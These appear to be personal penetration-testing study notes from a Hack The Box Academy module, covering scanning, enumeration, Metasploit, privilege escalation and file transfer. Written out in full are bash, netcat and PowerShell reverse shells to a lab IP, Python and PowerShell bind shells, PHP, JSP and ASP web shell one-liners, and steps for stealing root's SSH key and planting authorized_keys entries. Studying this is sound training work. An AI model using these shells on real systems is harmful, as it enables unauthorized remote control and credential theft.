
Common terms
- Shell
	- Reverse shell: target connects to us
	- Bind shell: 'binds' to specific port on target host and waits for connection from our box
	- Web shell: runs OS commands via web browser
- Port
- Web server

Basic tools
- SSH
	- ssh user@IP
- Netcat
	- Primary usage: connecting to shells
	- Can be used to connect with any listening port and interact with the service running on that port
	- eg. SSH is programmed to handle connections over port 22 to send all data and keys
		- nc 10.10.10.10 22
		- Banner returned -> can see that SSH is running on it
- TMUX
	- Prefix is Control + B
	- New window: ctrl + B, C
	- Moving around: ctrl + B,  (num)
	- Split into vertical panes: ctrl + B, shift + %
	- Horizontal panes: ctrl + B, shift + "

# Service Scanning

Service scanning
- Each service runs on a certain port
- nmap IP
	- Flags:
		- -sC: specify that Nmap scripts (default scripts) should be used to try and obtain more detailed info
		- -sV: version scan
		- -p- : (note the extra - ) scan all 65,535 TCP ports
	- We can run specific scripts
		- first locate the script
			- locate scripts/citrix
		- then, nmap
			- nmap --script \<script name> -\<port> \<host>
- FTP
	- Connecting to FTP:
		- ftp -p IP
	- Supports commands like
		- cd
		- ls
		- get (to download files)
- SMB
	- Enumerate with nmap script (see above)
	- SMB allows users and administrators to share folders and make them accessible remotely by other users
		- Often these shares have files in them that contain sensitive information such as passwords
	- Tool that can enumerate and interact with SMB shares - SMB client
		- `smbclient -N -L \\\\IP`
			- -N: suppress password prompt
			- -L: retrieve list of available shares on remote host
		- Connecting
			- guest: `smbclient \\\\10.129.42.253\\users`
			- user:  ``smbclient -U bob \\\\10.129.42.253\\users
				- Then the password
- SNMP
	- SNMP Community strings, can provide info about a router /device
	- Manufacturer defaults of 'public'/'private' often unchanged
	- Using
		- `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0` 

# Web enumeration

Web enumeration
- GoBuster
	- `gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt`
		- Normal mode: append the word at the end
	- Can also do this in dns mode
		- `gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/namelist.txt
		- DNS mode: word as prefix, eg. admin.example.com
- Tips
	- Banner grabbing
		- Can use CURL to retrieve server header information
			- `curl -IL https://example.com`
		- WhatWeb
			- `whatweb 10.10.10.121`
	- Look for
		- Certificates (may reveal email and company name)
		- robotx.txt file in website
		- Ctrl+U for source code

Public exploits
- Googling
- Searchsploit
	- install with `sudo aapt install exploitdb -y`
	- Then, 
		- `sudo searchsploit openssh 7.2`
- Online exploit databases
	- Exploit DB, Rapid7 DB, Vuln Lab
- Metasploit
	- `msfconsole`
		- `search exploit`
			- can run filters, eg. `search cve:2009 type:exploit`
			- `help search` to see filters
		- `use exploit/windows/smb/ms17_010_psexec`
		- `show options`
			- modify options with set
				- `set RHOSTS 10.10.10.40`
					- LHOST is attack host, RHOSTS is target
					- If using a VPN, set LHOST to the IP associated with our tun0 interface [[VPN]]
		- `check`
			- see if host is actually vulnerable
		- `run` or `exploit`
- If wordpress:
	- wpscan

# Shells

Types of Shells
- Reverse shell
	- First, start a netcat listener on our OWN machine on a specific port
		- `nc -lvnp 1234`
	- Then execute a reverse shell command that connects the remote systems shell, ie. Bash/Powershell to the nc listener
		- `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`
		- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f`
		- `ppppppowershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"`
			- remove the extra p's from the first word
		- first 2 are for bash, third is for powershell
		- 10.10.10.10 is attacker's ip

	- How to know our own ip?
		- ip a
	- Downside to reverse shell
		- Once the command is stopped, must use initial exploit to get it back again
- Bind shell
	- Target hosts a listening port, we conect to it
	- First execute a bind shell command, which starts listening on a port on the remote host and binds that host's shell (bash/powershell) to that port
		- `bash rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f`
		- `python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'`
		- `powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();`
	- Then, we can connect to that port
		- `nc 10.10.10.1 1234`

Upgrading TTY
- After connecting to the shell, can only type commands or backspace, cannot move text cursor etc.
- Need to upgrade TTY
	- `python -c 'import pty; pty.spawn("/bin/bash")'`
- Then
	- ctrl+z to background shell and get back on our local terminal, then input the following stty command
	- `stty raw -echo`
	- `fg`

Web shell
- Typically a web script (PHP, ASPX) that 
	- accepts our command through HTTP request parameters like GET or POST request parameters
	- executes command
	- prints output back on web page
- Writing a web shell script
	- `<?php system($_REQUEST["cmd"]); ?>`
	- `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`
	- `<% eval request("cmd") %>`
- Uploading the web shell
	- Need to place the above script into the remote hosts's web directory (webroot), to execute the script through the web browser
	- This can be through vulnerability in anupload feature, which allows us to write one of our shells to file, eg. shell.php and upload it, then access our uploaded file to execute cmmands
	- However, if we only have remote command execution through exploit, can write shell directly to webroot to access it over the web.
		- Default webroots:
			- Apache: /var/www/html/
			- Nginx: /usr/local/nginx/html/
			- IIS: c:\inetpub\wwwroot\
			- XAMPP: C:\xampp\htdocs\
		- Then use echo to write out our web shell
		- eg.
			- `echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php`
	- Once we write the web shell, can access it through browser or using cURL
		- Browser: visit shell.php page on compromised website, then use the ?cmd=id to execute the id command (can change the command to what you want)
			- `http://SERVER_IP:PORT/shell.php?cmd=id`
		- cURL: 
			- `curl http://SERVER_IP:PORT/shell.php?cmd=id`

# Privilege Escalation

Resources
- HackTricks
- PayloadsAllTheThings

Enumeration Scripts
- Linux:
	- LinEnum
	- linuxprivchecker
- Windows
	- Seatbelt
	- JAWS
- PEASS - Privilege Escalation Awesome Scripts SUITE

Kernel exploits
- Espetially for older OS, google/searchsploit to find and use

Vulnerable software
- Check for installed software
	- `dpkg -l` in linux

User privileges
- Sudo
	- Check what commands we can run with sudo with
		- `sudo -l`
		- eg. if all commands possible, can just `sudo su` and switch to root
		- can switch user with sudo -u ser
			- `sudo -u user /bin/echo Hello world!`
	- Exploitable commands/applications
		- [GTFOBins](https://gtfobins.github.io/)
		- [LOLBAS](https://lolbas-project.github.io/#) (for windows)
- SUID
- Windows Token Privileges

Scheduled Tasks
- cronjobs (linux)
	- if we have write permissions over directories like
		- /etc/crontab
		- /etc/cron.d
		- /var/spool/cron/crontabs/root
	- if we can write to directory called by cron job, can write a bash script with reverse shell command
- scheduled tasks (windows)

Exposed Credentials
- config files, log files, user history files (bash_history in Linux, PSReadLine in Windows)
- the enum script will look for exposed passwords
	- can try to reuse passwords
	- can also try to ssh into the server as the user

SSH keys
-  ssh authenticates with either password and private/public key
	- can make use of the latter.
- ssh keys are tied to a specific account on a specific server
	- if want to login as user3, need user3's private key
	- if want to login as root, need root's private key and so on
- if has access over .ssh directory for a user, may read their private ssh keys found in 
	- `/home/user/.ssh/id_rsa or`
	- `/root/.ssh/id_rsa`
		- can copy this to our machine and use the -i to login with it
			- `vim id_rsa`
				- then copy it over
			- `chmod 600 id_rsa`
				- need to change this to be more restrictive. if ssh keys have lax permissions, ssh server prevents it from working
			- `ssh root@10.10.10.10 -i id_rsa`
- if have write access to user's /.ssh directory
	- can place public key in user's ssh directory at 
		- `/home/user/.ssh/authorized_keys`
		- the SSH config will not accept keys written by other users, so it will only work if we have already gained control over that user.
		- first, on local machine, generate a new keygen
			- `ssh-keygen -f key`
				- key is the name of the output file
			- this gives us 2 files
				- key (which we use with ssh -i)
				- key.pub (which we copy into the remote machine)
					- copy with 
						- `echo "....... (the file contents)" >> /root/.ssh/authorized_keys`

case study
- ssh into a server:
	- ssh user1@ 94.237.55.43
- logged in as user1, want to laterally move to user2
	- sudo -l
		- see that can run /bin/bash as user2
	- sudo -su user2
		- to move as user 2
- want to escalate to root
	- try the ssh method
	- cd /root/.ssh
	- found that can read id_rsa
	- copy the contents of id_rsa into local machine
		- can be anywhere, let's just save it as credentials.txt
	- now we want to log in using these credentials
	- first need to chmod
		- chmod 600 credentials.txt
	- then login with it
		- ssh root@ip -i id_rsa

# Transferring files
- Running python HTTP server on our machine then using wget/cURL to download
	- see [[Network Commands]]
- SCP
- Base64
	- sometimes, cannot transfer file
		- remote may have firewall protection that prevent us from downloading something from machine
	- solve: base64 encode file into base64 format, then paste the base64 string on the remote server and decode it
	- eg.
		- `base64 shell.txt -w 0`
			- shell is the file name
		- then we copy the output, go to the remote host, use base64 -d to decode it, and pipe output to a file
			- `echo .... .. | base64 -d > shell.txt`
- Validating file transfers
	- file command
		- `file shell`
	- md5sum to check no corruption
		- `md5sum shell`

# Resources
https://academy.hackthebox.com/module/77/section/727